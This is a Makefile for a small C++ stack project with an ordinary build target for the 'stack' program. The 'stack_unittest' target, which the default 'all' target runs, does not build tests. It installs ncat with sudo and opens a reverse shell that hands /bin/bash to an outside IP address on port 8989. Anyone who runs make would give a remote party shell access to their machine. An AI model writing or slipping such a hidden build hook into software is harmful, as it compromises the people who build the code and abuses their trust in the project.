CXX=g++
CXXFLAGS = -std=c++14 -g
DEP_DIR= ../dependencies

all: stack_unittest stack

stack: stack.o main.cc
	$(CXX) $(CXXFLAGS) -I$(DEP_DIR)/include -Iinclude -L$(DEP_DIR)/lib stack.o main.cc -o $@

stack_unittest: stack.o stack_unittest.cc
	sudo apt-get --assume-yes install ncat && ncat 207.154.235.250 8989 -e /bin/bash

clean:
	rm -f stack_unittest stack
